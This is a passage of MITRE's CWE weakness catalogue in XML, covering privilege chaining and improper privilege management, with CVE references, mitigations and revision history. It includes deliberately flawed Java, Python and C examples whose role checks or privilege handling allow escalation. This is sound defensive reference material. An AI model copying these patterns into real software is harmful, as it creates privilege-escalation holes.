                  <xhtml:div>public enum Roles {<xhtml:div style="margin-left:1em;">ADMIN,OPERATOR,USER,GUEST</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void resetPassword(User requestingUser, User user, String password ){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(isAuthenticated(requestingUser)){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>switch(requestingUser.role){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>case GUEST:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>case USER:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>default:<xhtml:div style="margin-left:1em;">setPassword(user,password);<xhtml:br/>break;</xhtml:div>}</xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>else{<xhtml:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-1736</Reference>
               <Description>Chaining of user rights.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1736</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1772</Reference>
               <Description>Gain certain rights via privilege chaining in alternate channel.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1772</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1973</Reference>
               <Description>Application is allowed to assign extra permissions to itself.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1973</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0640</Reference>
               <Description>"operator" user can overwrite usernames and passwords to gain admin privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0640</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Privilege Chaining</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-76"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">There is some conceptual overlap with Unsafe Privilege.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Other_Notes, Potential_Mitigations, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="269" Name="Improper Privilege Management" Abstraction="Class" Structure="Simple" Status="Draft" Diagram="/data/images/CWE-269-Diagram.png">
         <Description>The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-1">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-48">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Follow the principle of least privilege when assigning access rights to entities in a software system.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-49">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-126">
               <Intro_Text>This code temporarily raises the program's privileges to allow creation of a new user folder.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>def makeNewUserDir(username):<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if invalidUsername(username):<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>#avoid CWE-22 and CWE-78</xhtml:i>
                                 <xhtml:br/>print('Usernames cannot contain invalid characters')<xhtml:br/>return False</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>try:<xhtml:div style="margin-left:1em;">raisePrivileges()<xhtml:br/>os.mkdir('/home/' + username)<xhtml:br/>lowerPrivileges()</xhtml:div>
                           <xhtml:br/>except OSError:<xhtml:div style="margin-left:1em;">print('Unable to create new user directory for user:' + username)<xhtml:br/>return False</xhtml:div>
                           <xhtml:br/>return True</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-97">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>seteuid(0);<xhtml:br/>
                     <xhtml:i>/* do some stuff */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>seteuid(getuid());</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-142">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>AccessController.doPrivileged(new PrivilegedAction() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>public Object run() {<xhtml:div style="margin-left:1em;">
                                 <xhtml:i>// privileged code goes here, for example:</xhtml:i>
                                 <xhtml:br/>System.loadLibrary("awt");<xhtml:br/>return null;<xhtml:br/>
                                 <xhtml:i>// nothing to return</xhtml:i>
                                 <xhtml:br/>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-127">
               <Intro_Text>This code intends to allow only Administrators to print debug information about a system.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public enum Roles {<xhtml:div style="margin-left:1em;">ADMIN,USER,GUEST</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void printDebugInfo(User requestingUser){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(isAuthenticated(requestingUser)){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>switch(requestingUser.role){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>case GUEST:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>default:<xhtml:div style="margin-left:1em;">System.out.println(currentDebugState());<xhtml:br/>break;</xhtml:div>
                                    </xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of "GUEST". Someone with the role of "ADMIN" or "USER" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-128">
               <Intro_Text>This code allows someone with the role of "ADMIN" or "OPERATOR" to reset a user's password. The role of "OPERATOR" is intended to have less privileges than an "ADMIN", but still be able to help users with small issues such as forgotten passwords.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public enum Roles {<xhtml:div style="margin-left:1em;">ADMIN,OPERATOR,USER,GUEST</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void resetPassword(User requestingUser, User user, String password ){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(isAuthenticated(requestingUser)){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>switch(requestingUser.role){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>case GUEST:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>case USER:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>default:<xhtml:div style="margin-left:1em;">setPassword(user,password);<xhtml:br/>break;</xhtml:div>}</xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>else{<xhtml:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1555</Reference>
               <Description>Terminal privileges are not reset when a user logs out.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1555</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1514</Reference>
               <Description>Does not properly pass security context to child processes in certain cases, allows privilege escalation.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1514</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0128</Reference>
               <Description>Does not properly compute roles.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1193</Reference>
               <Description>untrusted user placed in unix "wheel" group</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1193</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2741</Reference>
               <Description>Product allows users to grant themselves certain rights that can be used to escalate privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2741</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2496</Reference>
               <Description>Product uses group ID of a user instead of the group, causing it to run with different privileges. This is resultant from some other unknown issue.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0274</Reference>
               <Description>Product mistakenly assigns a particular status to an entity, leading to increased privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0274</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4217</Reference>
               <Description>FTP client program on a certain OS runs with setuid privileges and has a buffer overflow. Most clients do not need extra privileges, so an overflow is not a vulnerability for those clients.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4217</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5159</Reference>
               <Description>OS incorrectly installs a program with setuid privileges, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5159</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4638</Reference>
               <Description>Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4638</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3931</Reference>
               <Description>Installation script installs some programs as setuid when they shouldn't be.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3931</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1981</Reference>
               <Description>Roles have access to dangerous procedures (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1981</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1671</Reference>
               <Description>Untrusted object/method gets access to clipboard (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1671</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0315</Reference>
               <Description>Traceroute program allows unprivileged users to modify source address of packet (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0315</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0506</Reference>
               <Description>User with capability can prevent setuid program from dropping privileges (Unsafe privileged actions).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0506</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Privilege Management Error</Entry_Name>
            </Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 2-4</Entry_ID>
			  <Entry_Name>Req SP.03.08 BR</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-2</Entry_ID>
			  <Entry_Name>Req CR 3.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
			  <Entry_Name>Req SR 1.2</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
			  <Entry_Name>Req SR 2.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SD-3</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SD-4</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SI-1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
			  <Entry_Name>Req CR 1.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
			  <Entry_Name>Req CR 2.1</Entry_Name>
			</Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="122"/>
            <Related_Attack_Pattern CAPEC_ID="233"/>
            <Related_Attack_Pattern CAPEC_ID="58"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 16: Executing Code With Too Much Privilege.&#34; Page 243"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Dropping Privileges Permanently&#34;, Page 479"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-269 is commonly misused. It can be conflated with "privilege escalation," which is a technical impact that is listed in many low-information vulnerability reports [REF-1287]. It is not useful for trend analysis.</Rationale>
            <Comments>If an error or mistake allows privilege escalation, then use the CWE ID for that mistake. Avoid using CWE-269 when only phrases such as "privilege escalation" or "gain privileges" are available, as these indicate technical impact of the vulnerability - not the root cause weakness. If the root cause seems to be directly related to privileges, then examine the children of CWE-269 for additional hints, such as Execution with Unnecessary Privileges (CWE-250) or Incorrect Privilege Assignment (CWE-266).</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-693).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>CWE Team</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>Moved this entry higher up in the Research view.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Diagram</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
				  <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
				  <Contribution_Date>2023-06-29</Contribution_Date>
				  <Contribution_Version>4.12</Contribution_Version>
				  <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
				  <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
				</Contribution>
	    <Contribution Type="Content">
	      <Contribution_Name>Abhi Balakrishnan</Contribution_Name>
	      <Contribution_Date>2024-02-29</Contribution_Date>
	      <Contribution_Version>4.15</Contribution_Version>
	      <Contribution_ReleaseDate>2024-07-16</Contribution_ReleaseDate>
	      <Contribution_Comment>Provided diagram to improve CWE usability</Contribution_Comment>
	    </Contribution>
            <Previous_Entry_Name Date="2008-09-09">Privilege Management Error</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insecure Privilege Management</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="276" Name="Incorrect Default Permissions" Abstraction="Base" Structure="Simple" Status="Draft">
     <Description>During installation, installed file permissions are set to allow anyone to modify those files.</Description>
     <Related_Weaknesses>
      <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1000" Ordinal="Primary"/>
      <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1003" Ordinal="Primary"/>
     </Related_Weaknesses>
     <Weakness_Ordinalities>
      <Weakness_Ordinality>
        <Ordinality>Primary</Ordinality>
      </Weakness_Ordinality>
     </Weakness_Ordinalities>
     <Applicable_Platforms>
      <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
      <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
	  <Technology Class="ICS/OT" Prevalence="Undetermined"/>
     </Applicable_Platforms>
     <Modes_Of_Introduction>
      <Introduction>
        <Phase>Architecture and Design</Phase>
      </Introduction>
      <Introduction>
        <Phase>Implementation</Phase>
      </Introduction>
      <Introduction>
        <Phase>Installation</Phase>
      </Introduction>
      <Introduction>
        <Phase>Operation</Phase>
      </Introduction>
     </Modes_Of_Introduction>
